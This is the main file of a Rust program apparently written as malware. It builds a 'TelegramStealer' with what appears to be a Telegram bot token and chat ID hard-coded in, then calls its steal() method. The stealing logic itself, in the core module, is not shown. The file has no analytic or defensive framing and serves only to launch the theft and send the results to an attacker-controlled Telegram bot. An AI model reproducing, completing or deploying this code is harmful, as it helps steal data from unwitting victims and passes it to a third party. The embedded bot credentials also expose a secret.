extern crate user32;
extern crate winapi;

pub mod core;
pub mod utils;
use crate::core::TelegramStealer;

fn main() {
    TelegramStealer::new(
        "5279761929:AAEnsQN3NyCqW5bJndsBzWOdWbqr4G3J9bQ".to_string(),
        "612753417".to_string(),
    )
    .steal()
    .unwrap();
}
